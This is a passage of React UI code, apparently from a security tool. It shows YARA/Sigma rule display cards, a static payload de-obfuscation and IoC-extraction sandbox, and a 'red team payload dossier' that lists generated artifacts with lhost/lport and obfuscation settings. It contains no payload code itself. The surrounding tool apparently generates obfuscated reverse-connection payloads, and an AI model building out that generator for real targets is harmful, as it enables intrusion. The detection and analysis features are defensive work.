                  Auto-compiled YARA rules and Sigma behavioral alerts tailored to identify and quarantine the active payload family.
                </p>
              </div>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-2 gap-4 sm:gap-6 flex-1">
              {/* YARA Rule Card */}
              <div className="bg-slate-900 border border-slate-800 rounded-xl flex flex-col overflow-hidden min-h-[260px]">
                <div className="h-10 bg-slate-950 px-3 sm:px-4 flex items-center justify-between border-b border-slate-800">
                  <span className="text-xs font-mono font-bold text-cyan-400 flex items-center gap-1.5">
                    <Code2 className="w-3.5 h-3.5" />
                    YARA DETECTION RULE (.yar)
                  </span>
                  <button
                    onClick={() => {
                      navigator.clipboard.writeText(yaraRule);
                      alert("YARA rule copied to clipboard.");
                    }}
                    className="text-xs text-slate-400 hover:text-slate-200 font-mono flex items-center gap-1 min-h-[32px] px-2"
                  >
                    <Copy className="w-3 h-3" /> COPY
                  </button>
                </div>
                <div className="flex-1 p-3 sm:p-4 bg-slate-950 font-mono text-xs text-cyan-200 overflow-auto whitespace-pre-wrap">
                  {yaraRule}
                </div>
              </div>

              {/* Sigma Rule Card */}
              <div className="bg-slate-900 border border-slate-800 rounded-xl flex flex-col overflow-hidden min-h-[260px]">
                <div className="h-10 bg-slate-950 px-3 sm:px-4 flex items-center justify-between border-b border-slate-800">
                  <span className="text-xs font-mono font-bold text-emerald-400 flex items-center gap-1.5">
                    <FileCode className="w-3.5 h-3.5" />
                    SIGMA SIEM DETECTION RULE (.yml)
                  </span>
                  <button
                    onClick={() => {
                      navigator.clipboard.writeText(sigmaRule);
                      alert("Sigma rule copied to clipboard.");
                    }}
                    className="text-xs text-slate-400 hover:text-slate-200 font-mono flex items-center gap-1 min-h-[32px] px-2"
                  >
                    <Copy className="w-3 h-3" /> COPY
                  </button>
                </div>
                <div className="flex-1 p-3 sm:p-4 bg-slate-950 font-mono text-xs text-emerald-200 overflow-auto whitespace-pre-wrap">
                  {sigmaRule}
                </div>
              </div>
            </div>
          </div>
        )}

        {/* VIEW 3: STATIC ANALYSIS & DE-OBFUSCATION SANDBOX */}
        {subView === "sandbox" && (
          <div className="flex-1 flex flex-col p-3 sm:p-6 overflow-y-auto space-y-4 sm:space-y-6">
            <div className="flex items-center justify-between">
              <div>
                <h3 className="text-xs sm:text-sm font-bold font-mono text-slate-100 uppercase flex items-center gap-2">
                  <Eye className="w-4 h-4 text-amber-400 shrink-0" />
                  STATIC PAYLOAD INSPECTION & DE-OBFUSCATION SANDBOX
                </h3>
                <p className="text-[10px] sm:text-xs text-slate-400 font-mono">
                  Paste suspicious script blocks or encoded shellcode to compute Shannon entropy, extract C2 IoCs, and deconstruct intent.
                </p>
              </div>
            </div>

            <div className="grid grid-cols-1 lg:grid-cols-2 gap-4 sm:gap-6">
              {/* Input Area */}
              <div className="bg-slate-900 border border-slate-800 rounded-xl p-3 sm:p-4 flex flex-col space-y-3">
                <label className="text-xs font-mono uppercase text-slate-400 font-bold">
                  Raw / Obfuscated Payload Input:
                </label>
                <textarea
                  value={sandboxInput}
                  onChange={(e) => setSandboxInput(e.target.value)}
                  rows={6}
                  className="w-full flex-1 bg-slate-950 border border-slate-800 rounded-lg p-3 text-xs font-mono text-slate-200 focus:outline-none focus:border-amber-500/50 resize-none"
                  placeholder="Paste encoded script, base64 blob, or shellcode..."
                />
                <button
                  onClick={handleAnalyzePayload}
                  disabled={isAnalyzing}
                  className="w-full py-2.5 bg-amber-600 hover:bg-amber-500 text-white rounded-lg text-xs font-mono font-bold flex items-center justify-center space-x-2 transition-all cursor-pointer disabled:opacity-50 min-h-[44px]"
                >
                  {isAnalyzing ? (
                    <>
                      <RefreshCw className="w-4 h-4 animate-spin" />
                      <span>INSPECTING ARTIFACT...</span>
                    </>
                  ) : (
                    <>
                      <Search className="w-4 h-4" />
                      <span>EXECUTE STATIC INSPECTION & IOC EXTRACTION</span>
                    </>
                  )}
                </button>
              </div>

              {/* Analysis Results Card */}
              <div className="bg-slate-900 border border-slate-800 rounded-xl p-3 sm:p-5 flex flex-col space-y-4">
                <div className="flex items-center justify-between border-b border-slate-800 pb-3">
                  <span className="text-xs font-mono font-bold text-slate-200">
                    INSPECTION TELEMETRY
                  </span>
                  {analysisResult && (
                    <span
                      className={`px-2.5 py-0.5 rounded text-[10px] sm:text-[11px] font-mono font-bold ${
                        analysisResult.estimatedThreatLevel === "CRITICAL"
                          ? "bg-rose-500/20 text-rose-300 border border-rose-500/30"
                          : "bg-amber-500/20 text-amber-300 border border-amber-500/30"
                      }`}
                    >
                      {analysisResult.estimatedThreatLevel} THREAT
                    </span>
                  )}
                </div>

                {analysisResult ? (
                  <div className="space-y-4 text-xs font-mono">
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 bg-slate-950 p-3 rounded-lg border border-slate-800/80">
                      <div>
                        <span className="text-slate-500 block text-[10px]">SHANNON ENTROPY:</span>
                        <span className="text-amber-300 font-bold">{analysisResult.entropy}</span>
                        <span className="text-slate-400 text-[10px] block">
                          ({analysisResult.entropyClassification})
                        </span>
                      </div>
                      <div>
                        <span className="text-slate-500 block text-[10px]">EXTRACTED IOCS:</span>
                        <span className="text-rose-400 font-bold">
                          {analysisResult.detectedIps.length} IPs / {analysisResult.detectedUrls.length} URLs
                        </span>
                      </div>
                    </div>

                    {analysisResult.detectedIps.length > 0 && (
                      <div>
                        <span className="text-slate-400 text-[10px] block uppercase font-bold mb-1">
                          Extracted Network Endpoints:
                        </span>
                        <div className="flex flex-wrap gap-1.5">
                          {analysisResult.detectedIps.map((ip) => (
                            <span
                              key={ip}
                              className="px-2 py-0.5 rounded bg-rose-500/10 border border-rose-500/20 text-rose-300 font-mono text-[11px]"
                            >
                              {ip}
                            </span>
                          ))}
                        </div>
                      </div>
                    )}

                    {analysisResult.suspiciousApis.length > 0 && (
                      <div>
                        <span className="text-slate-400 text-[10px] block uppercase font-bold mb-1">
                          Suspicious Invocations:
                        </span>
                        <div className="flex flex-wrap gap-1.5">
                          {analysisResult.suspiciousApis.map((api) => (
                            <span
                              key={api}
                              className="px-2 py-0.5 rounded bg-amber-500/10 border border-amber-500/20 text-amber-300 font-mono text-[11px]"
                            >
                              {api}
                            </span>
                          ))}
                        </div>
                      </div>
                    )}

                    <div className="bg-slate-950 p-3 rounded-lg border border-slate-800">
                      <span className="text-slate-400 text-[10px] block uppercase font-bold mb-1">
                        Behavioral Summary:
                      </span>
                      <p className="text-slate-300 text-[11px] leading-relaxed">
                        {analysisResult.behavioralSummary}
                      </p>
                    </div>

                    {analysisResult.detectedIps.length > 0 && (
                      <button
                        onClick={handleIngestSandboxIocs}
                        className="w-full py-2.5 bg-rose-600 hover:bg-rose-500 text-white rounded-lg text-xs font-mono font-bold flex items-center justify-center space-x-2 transition-colors cursor-pointer min-h-[44px]"
                      >
                        <Network className="w-3.5 h-3.5" />
                        <span>INGEST EXTRACTED IOCS TO GRAPH CANVAS</span>
                      </button>
                    )}
                  </div>
                ) : (
                  <div className="flex-1 flex items-center justify-center text-center p-8 text-slate-500 text-xs font-mono">
                    Submit code to execute static deconstruction and indicator extraction.
                  </div>
                )}
              </div>
            </div>
          </div>
        )}

        {/* VIEW 4: DOSSIER & HISTORY */}
        {subView === "history" && (
          <div className="flex-1 flex flex-col p-3 sm:p-6 overflow-y-auto space-y-4">
            <div className="flex items-center justify-between">
              <h3 className="text-xs sm:text-sm font-bold font-mono text-slate-100 uppercase flex items-center gap-2">
                <Layers className="w-4 h-4 text-indigo-400" />
                SAVED RED TEAM PAYLOAD DOSSIER ({savedPayloads.length})
              </h3>
            </div>

            {savedPayloads.length === 0 ? (
              <div className="bg-slate-900 border border-slate-800 rounded-xl p-8 sm:p-12 text-center text-slate-500 font-mono text-xs">
                No payload artifacts saved in active session yet. Click "Save Dossier" on the generator view to stage artifacts here.
              </div>
            ) : (
              <div className="space-y-3">
                {savedPayloads.map((art) => (
                  <div
                    key={art.id}
                    className="bg-slate-900 border border-slate-800 rounded-xl p-3 sm:p-4 flex flex-col sm:flex-row sm:items-center justify-between gap-3 hover:border-slate-700 transition-colors"
                  >
                    <div className="space-y-1">
                      <div className="flex flex-wrap items-center gap-1.5 sm:gap-2">
                        <span className="text-xs font-bold font-mono text-slate-200">
                          {art.filename}
                        </span>
                        <span className="px-2 py-0.5 rounded text-[10px] font-mono bg-rose-500/10 text-rose-400 border border-rose-500/20">
                          {art.targetOS.toUpperCase()} {art.architecture}
                        </span>
                        <span className="px-2 py-0.5 rounded text-[10px] font-mono bg-indigo-500/10 text-indigo-400 border border-indigo-500/20">
                          {art.lhost}:{art.lport}
                        </span>
                      </div>
                      <p className="text-[10px] sm:text-[11px] font-mono text-slate-400">
                        Created: {new Date(art.createdAt).toLocaleTimeString()} | Obfuscation: {art.obfuscationMethod || "none"}
                      </p>
                    </div>

                    <div className="flex items-center space-x-2 shrink-0">
                      <button
                        onClick={() => {
                          setCurrentCode(art.rawCode);
                          setCurrentFilename(art.filename);
                          if (art.yaraRule) setYaraRule(art.yaraRule);
                          if (art.sigmaRule) setSigmaRule(art.sigmaRule);
                          setSubView("generate");
                          setMobileGeneratorTab("code");
                        }}
                        className="w-full sm:w-auto px-3 py-1.5 bg-slate-800 hover:bg-slate-700 text-slate-200 rounded text-xs font-mono transition-colors min-h-[36px]"
                      >
                        LOAD INTO EDITOR
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
};
